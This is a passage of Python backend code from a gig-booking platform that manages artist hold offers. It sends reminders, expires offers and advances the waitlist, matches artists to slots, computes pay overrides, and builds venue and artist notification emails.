# ──────────────────────────────────────────────────────────────────────


def process_hold_offers(db):
    """Two responsibilities per tick:
      1. Send the 12h reminder for any active offer that passed the
         half-way mark and hasn't been reminded yet.
      2. Expire any offer past offer_expires_at, mark declined,
         advance to next artist on the waitlist.

    Series-aware (Jul 2026 audit REDs #2, #3): a series hold stamps the
    same `offer_token` across every gig in the series. We group by
    `(offer_token, artist_id)` so one bundled offer fires one reminder
    and one expiry decline — not N for a 26-week series. Advancement
    runs through `_advance_series_bucket_for_artist` for series rows
    and `send_next_hold_offer` for per-gig rows.
    """
    from sqlalchemy import text
    # 1. Reminders. Group reminders by (offer_token, artist_id) so a
    #    series offer triggers ONE reminder email (not 26 for a 26-week
    #    series). Per-gig offers each have a unique token so they
    #    behave the same as before.
    # Audit fix #20: pull eligible candidates without SQLite-only
    # datetime() math; apply the "50% of window has elapsed" filter
    # in Python so this works on both SQLite and Postgres.
    from datetime import datetime as _dt, timedelta as _td
    _now = _dt.utcnow()
    raw_reminders = db.execute(
        text("""SELECT wl.offer_token, wl.artist_id,
                       MIN(wl.gig_id) as gig_id,
                       MIN(wl.offer_sent_at) as offer_sent_at,
                       MIN(wl.offer_expires_at) as offer_expires_at,
                       MAX(g.hold_offer_window_hours) as hold_offer_window_hours,
                       MAX(g.recurring_group_id) as recurring_group_id
                FROM gig_waitlist wl
                JOIN gigs g ON g.id = wl.gig_id
                WHERE wl.source = 'hold'
                  AND wl.offer_sent = 1
                  AND wl.offer_declined = 0
                  AND wl.reminder_sent_at IS NULL
                  AND wl.offer_expires_at > CURRENT_TIMESTAMP
                  AND COALESCE(g.hold_email_artists, 1) = 1
                GROUP BY wl.offer_token, wl.artist_id""")
    ).mappings().all()
    reminders = []
    for _r in raw_reminders:
        try:
            _sent = _dt.strptime(
                str(_r["offer_sent_at"]).replace("T"," ").split(".")[0],
                "%Y-%m-%d %H:%M:%S"
            )
            _win_h = int(_r["hold_offer_window_hours"] or 24)
            if _now - _sent >= _td(hours=_win_h / 2):
                reminders.append(_r)
        except Exception:
            pass
    for r in reminders:
        try:
            is_series = bool(r["recurring_group_id"])
            if is_series:
                # Series: send ONE bundled reminder using the series
                # email helper (lists every eligible gig). Mark every
                # row in the group with reminder_sent_at so we don't
                # re-fire next tick.
                _send_series_hold_offer_email(
                    db, recurring_group_id=r["recurring_group_id"],
                    artist_id=r["artist_id"], token=r["offer_token"],
                    is_reminder=True,
                )
            else:
                _send_hold_offer_email(db, gig_id=r["gig_id"],
                                       artist_id=r["artist_id"],
                                       token=r["offer_token"],
                                       is_reminder=True)
            # Mark ALL the rows for this group as reminded
            db.execute(
                text("""UPDATE gig_waitlist SET reminder_sent_at = CURRENT_TIMESTAMP
                        WHERE offer_token = :tok AND source = 'hold'
                          AND reminder_sent_at IS NULL"""),
                {"tok": r["offer_token"]}
            )
            db.commit()
        except Exception as e:
            logger.warning(f"[HOLD] reminder send failed token={r['offer_token'][:8]}: {e}")

    # 2. Expirations. Group by token — series offers expire as one unit.
    # Columns must be table-qualified — `gigs.artist_id` (single-slot
    # winner) collides with `gig_waitlist.artist_id` and SQLite rejects
    # the unqualified SELECT. Same shape as the reminder query above.
    expired = db.execute(
        text("""SELECT wl.offer_token, wl.artist_id,
                       MIN(wl.gig_id) as gig_id,
                       MAX(g.recurring_group_id) as recurring_group_id
                FROM gig_waitlist wl
                JOIN gigs g ON g.id = wl.gig_id
                WHERE wl.source = 'hold'
                  AND wl.offer_sent = 1
                  AND wl.offer_declined = 0
                  AND wl.offer_expires_at <= CURRENT_TIMESTAMP
                GROUP BY wl.offer_token, wl.artist_id""")
    ).mappings().all()
    advanced_gigs = set()
    for r in expired:
        is_series = bool(r["recurring_group_id"])
        # Mark every row sharing this token as declined in one shot.
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1
                    WHERE offer_token = :tok AND source = 'hold'
                      AND offer_declined = 0"""),
            {"tok": r["offer_token"]}
        )
        db.commit()
        logger.info(
            f"[HOLD] {'series' if is_series else 'per-gig'} offer expired "
            f"token={r['offer_token'][:8]} artist={r['artist_id']} — advancing"
        )
        # Venue notification — ONE per offer (not N).
        # YELLOW #2 audit: series uses series-aware wording.
        try:
            if is_series:
                _notify_venue_decline_series(db,
                    recurring_group_id=r["recurring_group_id"],
                    artist_id=r["artist_id"], reason="expired")
            else:
                _notify_venue_decline(db, gig_id=r["gig_id"], artist_id=r["artist_id"],
                                      reason="expired")
        except Exception as _ne:
            logger.warning(f"[HOLD] expiry notify-venue failed: {_ne}")
        # Advance.
        if is_series:
            _advance_series_bucket_for_artist(db, r["recurring_group_id"], r["artist_id"])
        else:
            if r["gig_id"] not in advanced_gigs:
                send_next_hold_offer(db, r["gig_id"])
                advanced_gigs.add(r["gig_id"])


# ──────────────────────────────────────────────────────────────────────
# Internals
# ──────────────────────────────────────────────────────────────────────


def _effective_pay_for_artist(db, slot, venue_id: int, artist_id: int):
    """Return the effective pay this artist should see for this slot.

    Rule (Jun 2026):
      - Flat slot → effective pay = max(slot.pay, override). Flat slots
                    ALWAYS honor the override.
      - Door slot → effective guarantee = max(guarantee_cents/100, override)
                    ONLY when `slot.apply_override = 1`. Default is 0
                    (ignore — guarantee floor is final). Venue opts in
                    per slot via a checkbox on the door config UI.
                    Door% always stays as published.

    Override only counts when the `preferred_artists` row is `status='approved'`.

    For door slots this returns the EFFECTIVE GUARANTEE dollars (caller
    renders as "$X + Y% door"). For flat slots it returns the effective
    flat pay. Either way: a scalar dollar amount.
    """
    is_door = (slot.get("deal_type") or "flat").lower() == "door"
    if is_door:
        base = float(slot.get("guarantee_cents") or 0) / 100.0
        # Door + apply_override=0 → no override application, return guarantee as-is.
        if not int(slot.get("apply_override") or 0):
            return base
    else:
        base = float(slot.get("pay") or 0)
    if not artist_id or not venue_id:
        return base
    try:
        from sqlalchemy import text as _t
        row = db.execute(
            _t("""SELECT pay_dollars_override, pay_cents_override
                  FROM preferred_artists
                  WHERE venue_id = :vid AND artist_id = :aid AND status='approved'"""),
            {"vid": venue_id, "aid": artist_id}
        ).mappings().first()
        if row and row.get("pay_dollars_override") is not None:
            override = float(row["pay_dollars_override"]) + float(row.get("pay_cents_override") or 0) / 100.0
            if override > base:
                return override
    except Exception:
        pass
    return base


def _list_open_hold_slots(db, gig_id: int):
    """Return the list of currently-open slots on this gig as dicts
    with id, slot_number, start_time, end_time, pay + deal info (so
    door-deal slots render correctly in the artist's banner / modal)
    + type fields for the match filter."""
    from sqlalchemy import text
    return db.execute(
        text("""SELECT id, slot_number, start_time, end_time, pay,
                       deal_type, door_pct, guarantee_cents,
                       COALESCE(apply_override, 0) as apply_override,
                       artist_type, band_formats, styles
                FROM gig_slots WHERE gig_id = :gid AND status = 'open'
                ORDER BY slot_number ASC"""),
        {"gid": gig_id}
    ).mappings().all()


def _csv_set(s):
    """CSV-or-semicolon-separated string → set of tokens (lowercased
    for case-insensitive compare). Used by _artist_matches_slot to
    match the frontend's _csvSet behavior."""
    if not s:
        return set()
    return {t.strip().lower() for t in str(s).replace(";", ",").split(",") if t.strip()}


_MC_TYPES = {"open mic mc", "karaoke mc"}


def _artist_matches_slot(artist_row, slot_row) -> bool:
    """Mirror of the frontend _artistMatchesSlot. An artist can only
    book a slot when:
      - slot.artist_type is set AND artist.artist_type equals it
      - if slot specifies band_formats, artist has at least one overlap
        (band_formats only apply to Live Band — MC types skip this)
      - if slot specifies styles, artist has at least one overlap
        (styles skipped for MC types per Jul 1 2026 product decision)
      - if slot.requires_equipment=1, artist.has_own_equipment must be
        true (per Jul 1 2026 MC-type equipment gate)
    Used to filter the open-slot list on hold respond so a DJ artist
    offered a multi-slot gig with a DJ slot + a Live Band slot only
    sees the DJ slot as bookable."""
    if not artist_row or not slot_row:
        return False
    s_type = (slot_row.get("artist_type") or "").strip()
    a_type = (artist_row.get("artist_type") or "").strip()
    if not s_type or not a_type:
        return False
    if s_type != a_type:
        return False
    # MC types have no band_formats / styles axis (per Jul 1 2026 spec).
    _is_mc = s_type.lower() in _MC_TYPES
    if not _is_mc:
        slot_fmt = _csv_set(slot_row.get("band_formats"))
        if slot_fmt:
            if not (slot_fmt & _csv_set(artist_row.get("band_formats"))):
                return False
        slot_styles = _csv_set(slot_row.get("styles"))
        if slot_styles:
            if not (slot_styles & _csv_set(artist_row.get("styles"))):
                return False
    # Equipment gate — venue set requires_equipment=1 → artist must have
    # opted in via artist.has_own_equipment. Treat NULL / 0 as no filter.
    _req = slot_row.get("requires_equipment")
    if _req in (1, True, "1", "true", "True"):
        _has = artist_row.get("has_own_equipment")
        if _has not in (1, True, "1", "true", "True"):
            return False
    return True


def _list_matching_open_slots(db, gig_id: int, artist_id: int):
    """Filter _list_open_hold_slots to only slots the artist matches.
    Pulls the artist's profile fields and runs each slot through
    _artist_matches_slot. Returns the list (possibly empty)."""
    from sqlalchemy import text
    artist = db.execute(
        text("""SELECT id, artist_type, band_formats, styles
                FROM artists WHERE id = :aid"""),
        {"aid": artist_id}
    ).mappings().first()
    open_slots = _list_open_hold_slots(db, gig_id)
    return [s for s in open_slots if _artist_matches_slot(artist, dict(s))]


def _mark_exhausted_and_notify(db, gig_id: int):
    from sqlalchemy import text
    db.execute(
        text("UPDATE gigs SET hold_status = 'exhausted' WHERE id = :gid"),
        {"gid": gig_id}
    )
    db.commit()
    logger.info(f"[HOLD] gig={gig_id} waitlist exhausted")
    # Fire the venue email + Activity Center notification
    try:
        _notify_venue_exhausted(db, gig_id=gig_id)
    except Exception as e:
        logger.warning(f"[HOLD] exhausted notify failed gig={gig_id}: {e}")


def _send_hold_offer_email(db, gig_id: int, artist_id: int, token: str, is_reminder: bool):
    """Render + send the offer (or reminder) email to the artist via
    SMTP. Template key: hold_offer_artist / hold_offer_reminder_artist.
    Falls back silently if SMTP unconfigured (test/dev)."""
    from sqlalchemy import text
    gig = db.execute(
        text("""SELECT g.id, g.date, g.title, g.venue_id, g.pay,
                       g.is_multi_slot, g.start_time, g.end_time,
                       v.venue_name
                FROM gigs g JOIN venues v ON v.id = g.venue_id
                WHERE g.id = :gid"""),
        {"gid": gig_id}
    ).mappings().first()
    if not gig:
        return
    artist = db.execute(
        text("""SELECT a.name, u.email FROM artists a
                LEFT JOIN users u ON u.id = a.user_id WHERE a.id = :aid"""),
        {"aid": artist_id}
    ).mappings().first()
    if not artist or not artist["email"]:
        logger.warning(f"[HOLD] no email on file for artist={artist_id}")
        return

    # Filter open slots to ones the artist actually matches. Showing
    # all open slots in the offer email would be misleading for a DJ
    # artist offered a multi-type gig — they'd see a Live Band slot
    # they can't book.
    open_slots = _list_matching_open_slots(db, gig_id, artist_id)
    is_multi = bool(gig.get("is_multi_slot"))

    # If no slots match this artist's type, don't send a useless offer.
    # Mark the waitlist row declined and advance to the next artist.
    if not open_slots:
        from sqlalchemy import text as _t
        logger.warning(
            f"[HOLD] gig={gig_id} artist={artist_id} has no matching "
            f"open slot — auto-declining + advancing"
        )
        db.execute(
            _t("""UPDATE gig_waitlist SET offer_declined = 1
                  WHERE gig_id = :gid AND artist_id = :aid AND source = 'hold'
                    AND offer_token = :tok"""),
            {"gid": gig_id, "aid": artist_id, "tok": token}
        )
        db.commit()
        send_next_hold_offer(db, gig_id)
        return

    # Build the dynamic template vars
    base_url = "https://gigsfill.com"
    respond_url = f"{base_url}/hold/respond/{token}"  # served via /hold redirect, set up in routes
    decline_url = f"{base_url}/hold/decline/{token}"

    # Compose the slot/pitch text variants
    if is_multi and len(open_slots) > 1:
        slots_pitch = f"This gig has {len(open_slots)} open slots — pick the one you want."
        accept_label = "Pick a slot →"
        multi_slot_pick_note = ""
    else:
        slots_pitch = "Confirm if you can play it."
        accept_label = "Accept"
        multi_slot_pick_note = ""

    def _pay_label(slot):
        """Render the pay column for a slot, applying the artist's
        per-venue pay override to BOTH flat and door slots:
          - Flat: returns "$<max(slot.pay, override)>"
          - Door: returns "$<max(guarantee, override)> + Y% door"
        Override only counts when preferred_artists row is 'approved'."""
        eff = _effective_pay_for_artist(db, slot, gig["venue_id"], artist_id)
        eff_fmt = f"${int(eff)}" if eff == int(eff) else f"${eff:.2f}"
        if (slot.get("deal_type") or "flat").lower() == "door":
            pct = int(slot.get("door_pct") or 0)
            return f"{eff_fmt} + {pct}% door"
        return eff_fmt

    # Build the slots table rows for the offer card
    if is_multi and len(open_slots) > 1:
        slot_rows_html = ""
        for s in open_slots:
            time_str = f"{_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])}"
            pay_lbl = _pay_label(s)
            slot_rows_html += (
                f'<tr><td style="padding: 6px 0; font-size: 14px; color: #6b7280;">Slot {s["slot_number"]}</td>'
                f'<td style="padding: 6px 0; font-size: 14px; color: #111827; font-weight: 500;">'
                f'{time_str}  ·  {pay_lbl}</td></tr>'
            )
    else:
        # Single-slot or fall-through gig — one Time + Pay row
        s = open_slots[0] if open_slots else None
        if s:
            time_str = f"{_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])}"
            pay_str = _pay_label(s)
        else:
            time_str = f"{_fmt_time(gig['start_time'])} – {_fmt_time(gig['end_time'])}"
            base = float(gig["pay"] or 0)
            # Apply override at the gig-pay level too as a safety net
            try:
                from sqlalchemy import text as _t
                row = db.execute(
                    _t("""SELECT pay_dollars_override, pay_cents_override
                          FROM preferred_artists
                          WHERE venue_id = :vid AND artist_id = :aid AND status='approved'"""),
                    {"vid": gig["venue_id"], "aid": artist_id}
                ).mappings().first()
                if row and row.get("pay_dollars_override") is not None:
                    ov = float(row["pay_dollars_override"]) + float(row.get("pay_cents_override") or 0) / 100.0
                    if ov > base:
                        base = ov
            except Exception:
                pass
            pay_str = f"${int(base)}" if base == int(base) else f"${base:.2f}"
        slot_rows_html = (
            f'<tr><td style="padding: 6px 0; font-size: 14px; color: #6b7280;">Time</td>'
            f'<td style="padding: 6px 0; font-size: 14px; color: #111827; font-weight: 500;">{time_str}</td></tr>'
            f'<tr><td style="padding: 6px 0; font-size: 14px; color: #6b7280;">Pay</td>'
            f'<td style="padding: 6px 0; font-size: 14px; color: #059669; font-weight: 600;">{pay_str}</td></tr>'
        )

    # Human-readable expiry timestamp — localize to venue's timezone
    # (Jul 2026 full-site audit — E-H6). Was raw UTC ISO string, which
    # meant a Pacific artist reading a Nashville venue's hold offer saw
    # a time 3 hours off their local. Venue TZ matches the rest of the
    # email content and matches what the venue would say verbally.
    exp_row = db.execute(
        text("SELECT offer_expires_at FROM gig_waitlist WHERE offer_token = :t"),
        {"t": token}
    ).scalar()
    if exp_row:
        try:
            from datetime import datetime as _dt, timezone as _tz
            from zoneinfo import ZoneInfo
            from backend.utils import get_venue_timezone_str
            _tz_name = get_venue_timezone_str(db, int(gig["venue_id"]))
            # exp_row is naive UTC; attach UTC then convert to venue tz.
            _raw = str(exp_row).replace("T", " ")
            # Drop microseconds and any trailing tz suffix so parse is clean.
            _raw = _raw.split(".")[0].split("+")[0].strip()
            _dt_utc = _dt.strptime(_raw, "%Y-%m-%d %H:%M:%S").replace(tzinfo=_tz.utc)
            _dt_local = _dt_utc.astimezone(ZoneInfo(_tz_name))
            offer_expires_human = _dt_local.strftime("%a, %b %d at %I:%M %p %Z")
        except Exception:
            offer_expires_human = str(exp_row).replace("T", " ").split(".")[0] + " UTC"
    else:
        offer_expires_human = "in 24 hours"

    template_key = "hold_offer_reminder_artist" if is_reminder else "hold_offer_artist"
    # BUG FIX (Jul 2026 audit): format the date human-friendly ("Friday,
    # March 5, 2026") to match every other transactional email on the
    # platform. Previously rendered the raw ISO ("2026-03-05") which
    # looked amateurish and made it harder for artists to parse the day.
    try:
        from backend.services.email_dispatch import format_email_date as _fed
        _date_display = _fed(gig["date"])
    except Exception:
        _date_display = str(gig["date"])
    vars_dict = {
        "artist_name": artist["name"] or "there",
        "venue_name": gig["venue_name"] or "the venue",
        "date": _date_display,
        "title": gig.get("title") or "",
        "slots_pitch": slots_pitch,
        "multi_slot_pick_note": multi_slot_pick_note,
        "accept_label": accept_label,
        "respond_url": respond_url,
        "decline_url": decline_url,
        "slots_table_rows": slot_rows_html,
        "offer_expires_human": offer_expires_human,
    }
    # Fan out hold-offer email to every artist entity user (Jun 2026 audit).
    # Previously only the artist row's primary user got the email, so a
    # band where the secondary booker (not the original signup) handles
    # offers would silently miss the entire hold cycle. Falls back to the
    # primary email if entity-user lookup returns nothing (e.g. solo).
    try:
        from backend.utils import get_all_entity_users as _gaeu
        _artist_users = _gaeu(db, "artist", artist_id) or []
        _emails = sorted({u["email"] for u in _artist_users if u.get("email")})
    except Exception as _aue:
        logger.warning(f"[HOLD] entity-user fan-out lookup failed artist={artist_id}: {_aue}")
        _emails = []
    if not _emails:
        _emails = [artist["email"]]
    for _to in _emails:
        _dispatch_template(db, to_email=_to, template_key=template_key, vars=vars_dict)
    # Activity Center notification — drop a record for every user with
    # artist access so they see "1 pending offer" in their dropdown even
    # when they're not on the book-gigs page. Banner on book-gigs is the
    # primary surface; this is the backup channel.
    if not is_reminder:
        _create_artist_notification(
            db, artist_id,
            f"Offer from {gig['venue_name']} — {gig['date']}",
            f"You've got 24 hours to accept or decline. Open the Calendar page to respond.",
            gig_id=gig_id
        )


def _create_artist_notification(db, artist_id: int, title: str, body: str, gig_id: int = None):
    """Activity Center entry for every user with access to this artist."""
    try:
        from backend.services.notification_service import create_notification
        from backend.utils import get_all_entity_users
        users = get_all_entity_users(db, "artist", artist_id)
        for u in users:
            create_notification(db, u["user_id"], "hold_offer", title, body, gig_id=gig_id)
        db.commit()
    except Exception as e:
        logger.warning(f"[HOLD] artist notification failed for artist={artist_id}: {e}")


def _notify_venue_accept(db, gig_id: int, artist_id: int, slot, remaining_open: int):
    """Email venue + drop in-app notification when an artist accepts."""
    from sqlalchemy import text
    gig = db.execute(
        text("""SELECT g.date, g.venue_id, v.venue_name FROM gigs g
                JOIN venues v ON v.id = g.venue_id WHERE g.id = :gid"""),
        {"gid": gig_id}
    ).mappings().first()
    artist = db.execute(
        text("SELECT name FROM artists WHERE id = :aid"), {"aid": artist_id}
    ).mappings().first()
    venue_users = _venue_emails(db, gig["venue_id"])
    if not venue_users:
        return
    slot_info = ""
    slot_info_phrase = ""
    if slot:
        time_str = f"{_fmt_time(slot['start_time'])} – {_fmt_time(slot['end_time'])}"
        slot_info = f"Slot {slot['slot_number']}: {time_str}"
        slot_info_phrase = f" (Slot {slot['slot_number']}, {time_str})"
    if remaining_open > 0:
        remaining_slots_note = (
            f"This gig still has {remaining_open} open slot{'s' if remaining_open != 1 else ''} — "
            "the hold is moving to the next artist on your list."
        )
    else:
        remaining_slots_note = "All slots on this gig are now booked. The hold is complete."
    # Pay rendering — door-deal slots show "$guarantee + door%" rather
    # than the bare pay value. The pay field on the slot row gets
    # bumped to the override at book time (for flat slots), so it's
    # already the correct effective number to display here. Door
    # slots: keep guarantee + door% as the canonical label.
    if slot and (slot.get("deal_type") or "flat").lower() == "door":
        _gua_dollars = float(slot.get("guarantee_cents") or 0) / 100.0
        _gua_fmt = f"${int(_gua_dollars)}" if _gua_dollars == int(_gua_dollars) else f"${_gua_dollars:.2f}"
        _pct = int(slot.get("door_pct") or 0)
        pay_display = f"{_gua_fmt} + {_pct}% door"
    else:
        _p = (slot["pay"] if slot else 0) or 0
        pay_display = f"${int(_p)}" if _p == int(_p) else f"${_p:.2f}"
    vars_dict = {
        "artist_name": artist["name"] if artist else "An artist",
        "date": str(gig["date"]),
        "venue_id": gig["venue_id"],
        "slot_info": slot_info,
        "slot_info_phrase": slot_info_phrase,
        # Legacy raw pay kept for backward-compat with any template
        # variable named {{pay}}; the door-aware string lives in
        # {{pay_display}} which the template renders directly.
        "pay": int(slot["pay"]) if slot and slot["pay"] and slot["pay"] == int(slot["pay"]) else (slot["pay"] if slot else 0),
        "pay_display": pay_display,
        "remaining_slots_note": remaining_slots_note,
    }
    for to_email in venue_users:
        _dispatch_template(db, to_email=to_email, template_key="hold_accept_venue", vars=vars_dict)
    _create_venue_notification(db, gig["venue_id"],
        f"{vars_dict['artist_name']} accepted hold",
        f"Booked {gig['date']}{slot_info_phrase}. {remaining_slots_note}",
        gig_id=gig_id)


def _notify_venue_decline(db, gig_id: int, artist_id: int, reason: str):
    from sqlalchemy import text
    gig = db.execute(
        text("""SELECT g.date, g.venue_id, v.venue_name FROM gigs g
                JOIN venues v ON v.id = g.venue_id WHERE g.id = :gid"""),
        {"gid": gig_id}
    ).mappings().first()
    artist = db.execute(
        text("SELECT name FROM artists WHERE id = :aid"), {"aid": artist_id}
    ).mappings().first()
    venue_users = _venue_emails(db, gig["venue_id"])
    if not venue_users:
        return
    # Is there a next artist queued?
    next_q = db.execute(
        text("""SELECT a.name FROM gig_waitlist wl
                JOIN artists a ON a.id = wl.artist_id
                WHERE wl.gig_id = :gid AND wl.source='hold'
                  AND wl.offer_sent = 0 AND wl.offer_declined = 0
                ORDER BY wl.position ASC LIMIT 1"""),
        {"gid": gig_id}
    ).mappings().first()
    if next_q:
        next_step_note = f"We've moved on to {next_q['name']} on your list. They have 24h to respond."
    else:
        next_step_note = "That was the last artist on your list. We'll let you know when the offer cycle finishes."
    vars_dict = {
        "artist_name": artist["name"] if artist else "An artist",
        "date": str(gig["date"]),
        "venue_id": gig["venue_id"],
        "decline_reason_phrase": "declined" if reason == "declined" else "didn't respond within the 24-hour window for",
        "next_step_note": next_step_note,
    }
    for to_email in venue_users:
        _dispatch_template(db, to_email=to_email, template_key="hold_decline_venue", vars=vars_dict)
    _create_venue_notification(db, gig["venue_id"],
        f"{vars_dict['artist_name']} {vars_dict['decline_reason_phrase']} the hold",
        next_step_note, gig_id=gig_id)


def _mark_series_exhausted_and_notify(db, recurring_group_id: str):
    """Series exhaustion (YELLOW #4 audit fix). When every artist_type
    bucket in a series has cycled through with no acceptances, flag
    every gig in the series with hold_status='exhausted' so the venue
    UI surfaces the resolve-exhausted action, and email the venue once.
    """
    from sqlalchemy import text
    db.execute(
        text("""UPDATE gigs SET hold_status = 'exhausted'
                WHERE recurring_group_id = :rgid AND hold_status = 'active'"""),
        {"rgid": recurring_group_id}
    )
    db.commit()
    venue_row = db.execute(
        text("""SELECT v.id as venue_id, v.venue_name,
                       MIN(g.date) as first_date, MAX(g.date) as last_date,
                       COUNT(DISTINCT g.id) as gig_count,
                       MIN(g.id) as anchor_gig_id
                FROM gigs g JOIN venues v ON v.id = g.venue_id
                WHERE g.recurring_group_id = :rgid
                GROUP BY v.id"""),
        {"rgid": recurring_group_id}
    ).mappings().first()
    if not venue_row:
        return
    venue_id = venue_row["venue_id"]
    msg = (f"Every artist on your hold list either declined or didn't respond. "
           f"{venue_row['gig_count']} date{'s' if venue_row['gig_count'] != 1 else ''} "
           f"({venue_row['first_date']} – {venue_row['last_date']}) need action.")
    _create_venue_notification(
        db, venue_id,
        "Series hold exhausted — action needed",
        msg,
        gig_id=int(venue_row["anchor_gig_id"])
    )
    logger.info(f"[SERIES_HOLD] rgid={recurring_group_id} exhausted — notified venue {venue_id}")


def _notify_venue_decline_series(db, recurring_group_id: str, artist_id: int, reason: str):
    """Series-aware variant of _notify_venue_decline (YELLOW #2 audit
    fix). Says "the series of N dates" instead of naming a single date.
    Sends ONE email to the venue + ONE activity-center notification."""
    from sqlalchemy import text
    venue_row = db.execute(
        text("""SELECT v.id as venue_id, v.venue_name,
                       MIN(g.date) as first_date, MAX(g.date) as last_date,
                       COUNT(DISTINCT g.id) as gig_count,
                       MIN(g.id) as anchor_gig_id
                FROM gigs g
                JOIN venues v ON v.id = g.venue_id
                WHERE g.recurring_group_id = :rgid
                GROUP BY v.id"""),
        {"rgid": recurring_group_id}
    ).mappings().first()
    if not venue_row:
        return
    venue_id = venue_row["venue_id"]
    artist = db.execute(
        text("SELECT name FROM artists WHERE id = :aid"), {"aid": artist_id}
    ).mappings().first()
    venue_users = _venue_emails(db, venue_id)
    if not venue_users:
        return
    # Next artist in queue, scoped to the series
    next_q = db.execute(
        text("""SELECT a.name, MIN(wl.position) as pos
                FROM gig_waitlist wl
                JOIN artists a ON a.id = wl.artist_id
                JOIN gigs g ON g.id = wl.gig_id
                WHERE g.recurring_group_id = :rgid
                  AND wl.source = 'hold'
                  AND wl.offer_sent = 0 AND wl.offer_declined = 0
                GROUP BY wl.artist_id
                ORDER BY pos ASC LIMIT 1"""),
        {"rgid": recurring_group_id}
    ).mappings().first()
    if next_q:
        next_step_note = f"We've moved on to {next_q['name']} on your list. They have 24h to respond."
    else:
        next_step_note = "That was the last artist on your list for this series. Check your gig pages to choose how to fill the remaining dates."
    aname = artist["name"] if artist else "An artist"
    decline_phrase = "declined" if reason == "declined" else "didn't respond within the 24-hour window for"
    gc = int(venue_row["gig_count"] or 0)
    series_label = f"the series of {gc} dates ({venue_row['first_date']} – {venue_row['last_date']})"
    vars_dict = {
        "artist_name": aname,
        "date": series_label,  # template field reused — shows series range instead of single date
        "venue_id": venue_id,
        "decline_reason_phrase": decline_phrase,
        "next_step_note": next_step_note,
    }
    for to_email in venue_users:
        _dispatch_template(db, to_email=to_email, template_key="hold_decline_venue", vars=vars_dict)
    _create_venue_notification(
        db, venue_id,
        f"{aname} {decline_phrase} the series hold",
        f"{gc} dates affected. {next_step_note}",
        gig_id=int(venue_row["anchor_gig_id"])
    )


def _notify_venue_exhausted(db, gig_id: int):
    from sqlalchemy import text
    gig = db.execute(
        text("""SELECT g.date, g.venue_id, v.venue_name FROM gigs g
                JOIN venues v ON v.id = g.venue_id WHERE g.id = :gid"""),
        {"gid": gig_id}
    ).mappings().first()
    venue_users = _venue_emails(db, gig["venue_id"])
    if not venue_users:
        return
    open_slots = _list_open_hold_slots(db, gig_id)
    tried = db.execute(
        text("""SELECT COUNT(*) FROM gig_waitlist
                WHERE gig_id = :gid AND source='hold' AND offer_sent = 1"""),
        {"gid": gig_id}
    ).scalar()
    if not open_slots:
        # All slots filled but waitlist still ran out — shouldn't happen
        # but be safe; nothing more to do.
        return

    # Booked slots — show artist + time + pay so the venue sees what
    # DID get filled before deciding to open/cancel the rest. Per user
    # request (Jun 2026) — was previously just a list of open slot
    # numbers.
    booked_slots = db.execute(
        text("""SELECT gs.slot_number, gs.start_time, gs.end_time, gs.pay,
                       gs.deal_type, gs.door_pct, gs.guarantee_cents,
                       a.name as artist_name
                FROM gig_slots gs
                LEFT JOIN artists a ON a.id = gs.artist_id
                WHERE gs.gig_id = :gid
                  AND gs.status IN ('booked','pending_contract','awaiting_venue_contract')
                ORDER BY gs.slot_number"""),
        {"gid": gig_id}
    ).mappings().all()

    def _pay_str(s):
        if (s.get("deal_type") or "flat").lower() == "door":
            gua = float(s.get("guarantee_cents") or 0) / 100.0
            gua_fmt = f"${int(gua)}" if gua == int(gua) else f"${gua:.2f}"
            return f"{gua_fmt} + {int(s.get('door_pct') or 0)}% door"
        p = float(s.get("pay") or 0)
        return f"${int(p)}" if p == int(p) else f"${p:.2f}"

    # HTML table rows — used by the {{booked_slots_html}} / {{open_slots_html}}
    # placeholders in the template. Two-column layout: slot + details.
    def _row(label, value):
        return (f'<tr>'
                f'<td style="padding:6px 0;font-size:14px;color:#6b7280;width:90px;">{label}</td>'
                f'<td style="padding:6px 0;font-size:14px;color:#111827;font-weight:500;">{value}</td>'
                f'</tr>')

    booked_rows_html = ""
    for s in booked_slots:
        time_str = f"{_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])}"
        artist = s.get("artist_name") or "—"
        pay = _pay_str(dict(s))
        booked_rows_html += _row(
            f"Slot {s['slot_number']}",
            f"<b>{artist}</b><br>"
            f'<span style="color:#6b7280;">{time_str} · </span>'
            f'<span style="color:#059669;font-weight:600;">{pay}</span>'
        )
    if not booked_rows_html:
        booked_rows_html = _row("Booked", "<i>None yet — every slot is still open.</i>")

    open_rows_html = ""
    for s in open_slots:
        time_str = f"{_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])}"
        pay = _pay_str(dict(s))
        open_rows_html += _row(
            f"Slot {s['slot_number']}",
            f'<span style="color:#6b7280;">{time_str} · </span>'
            f'<span style="color:#d97706;font-weight:600;">{pay}</span> '
            f'<span style="color:#dc2626;font-size:12px;">(needs an artist)</span>'
        )

    # Plain-text summary for notifications / older clients
    if len(open_slots) == 1:
        s = open_slots[0]
        summary = f"Slot {s['slot_number']} ({_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])})"
    else:
        summary = ", ".join(f"Slot {s['slot_number']}" for s in open_slots)

    vars_dict = {
        "venue_name": gig["venue_name"],
        "date": str(gig["date"]),
        "venue_id": gig["venue_id"],
        "open_slot_summary": summary,
        "open_slot_count": len(open_slots),
        "booked_slot_count": len(booked_slots),
        "booked_slots_html": booked_rows_html,
        "open_slots_html": open_rows_html,
        "artists_tried_count": int(tried or 0),
    }
    for to_email in venue_users:
        _dispatch_template(db, to_email=to_email, template_key="hold_exhausted_venue", vars=vars_dict)
    _create_venue_notification(db, gig["venue_id"],
        f"Your hold for {gig['date']} ran out",
        f"{tried} artist{'s' if tried != 1 else ''} tried, {summary} still open. Open it to all or cancel — your call.",
        gig_id=gig_id)


# ──────────────────────────────────────────────────────────────────────
# Lower-level helpers
# ──────────────────────────────────────────────────────────────────────


def _venue_emails(db, venue_id: int):
    """Return the venue owner + entity_users emails for notifications."""
    from sqlalchemy import text
    rows = db.execute(
        text("""SELECT u.email FROM users u
                JOIN venues v ON v.user_id = u.id WHERE v.id = :vid
                UNION
                SELECT u.email FROM users u
                JOIN entity_users eu ON eu.user_id = u.id
                WHERE eu.entity_type = 'venue' AND eu.entity_id = :vid"""),
        {"vid": venue_id}
    ).fetchall()
    return [r[0] for r in rows if r and r[0]]


def _create_venue_notification(db, venue_id: int, title: str, body: str, gig_id: int = None):
    """Drop an Activity Center notification for every user with venue access."""
    try:
        from backend.services.notification_service import create_notification
        from backend.utils import get_all_entity_users
